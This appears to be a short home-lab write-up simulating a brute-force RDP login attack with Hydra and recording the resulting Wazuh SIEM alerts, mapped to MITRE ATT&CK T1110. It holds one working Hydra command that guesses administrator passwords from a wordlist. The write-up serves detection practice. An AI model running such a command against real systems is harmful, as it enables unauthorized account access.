# Lab 3 — Brute Force Attack Simulation

## Objective
Simulate brute-force login attack using Hydra.

## Tools Used
- Kali Linux
- Hydra
- Windows RDP
- Wazuh SIEM

## Command Used
hydra -t 4 -V -f -l administrator -P rockyou.txt rdp://WINDOWS_IP

## Alerts Observed
- Multiple failed login attempts
- Authentication failure logs

## MITRE ATT&CK Mapping
Technique: T1110 — Brute Force  
Tactic: Credential Access

## Screenshots
- Hydra execution
- Wazuh brute-force logs
